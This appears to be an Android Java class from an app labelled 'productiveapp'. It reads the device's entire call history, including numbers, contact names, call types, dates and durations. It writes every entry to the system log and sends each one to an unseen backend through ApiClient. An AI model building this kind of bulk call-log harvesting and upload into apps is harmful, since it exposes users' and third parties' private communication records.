package com.example.productiveapp;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.util.Date;

public class CallLogManager {

    private static final String TAG = "CallLogManager";

    public static void getAndSendCallLogs(Context context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "READ_CALL_LOG permission not granted.");
            return;
        }

        Cursor managedCursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC" // Order by date, newest first
        );

        if (managedCursor == null) {
            Log.e(TAG, "Call log cursor is null.");
            return;
        }

        try {
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME); // Contact name if available

            Log.d(TAG, "Retrieving Call Logs...");

            if (managedCursor.moveToFirst()) {
                do {
                    String phNumber = managedCursor.getString(number);
                    String callType = managedCursor.getString(type);
                    String callDate = managedCursor.getString(date);
                    Date callDayTime = new Date(Long.valueOf(callDate));
                    String callDuration = managedCursor.getString(duration);
                    String contactName = (name != -1) ? managedCursor.getString(name) : "N/A";

                    String dir = null;
                    int dircode = Integer.parseInt(callType);
                    switch (dircode) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "OUTGOING";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "INCOMING";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            dir = "MISSED";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            dir = "REJECTED";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            dir = "BLOCKED";
                            break;
                        case CallLog.Calls.VOICEMAIL_TYPE:
                            dir = "VOICEMAIL";
                            break;
                        default:
                            dir = "UNKNOWN";
                    }

                    Log.d(TAG, "Call Log Entry: " +
                            "Name=" + contactName +
                            ", Number=" + phNumber +
                            ", Type=" + dir +
                            ", Date=" + callDayTime +
                            ", Duration=" + callDuration + "s");

                    // TODO: Send this data to your backend
                    ApiClient.sendCallLogData(context, phNumber, contactName, dir, callDayTime.getTime(), Integer.parseInt(callDuration));

                } while (managedCursor.moveToNext());
            } else {
                Log.d(TAG, "No call logs found.");
            }
        } finally {
            managedCursor.close();
        }
    }
}